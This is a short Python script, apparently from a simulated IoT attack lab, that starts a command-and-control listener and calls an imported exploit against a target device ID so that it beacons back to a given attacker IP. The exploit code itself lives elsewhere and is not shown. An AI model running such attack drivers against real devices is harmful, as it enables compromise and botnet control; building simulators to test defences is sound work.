import argparse
import asyncio
import sys
import os
import time

# Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from attacker_laptop.attack_orchestrator import start_c2_listener, trigger_exploit

async def main():
    parser = argparse.ArgumentParser(description="Attack 2 - Botnet C2 Beaconing Trigger")
    parser.add_argument("--target", default="localhost", help="Target simulator host (default: localhost)")
    parser.add_argument("--device-id", required=True, help="Target device ID to compromise (e.g. SIM-0010)")
    parser.add_argument("--attacker-ip", required=True, help="Local IP of the attacker machine for reverse connection")
    args = parser.parse_args()

    # Start the C2 listener thread
    start_c2_listener()

    # Trigger the exploit on the target device
    await trigger_exploit(args.target, args.device_id, args.attacker_ip, "beacon")

    print("[*] C2 Beaconing attack triggered. Keeping listener alive. Press Ctrl+C to terminate.")
    try:
        while True:
            await asyncio.sleep(3600)
    except KeyboardInterrupt:
        print("\n[-] Terminating attacker session.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
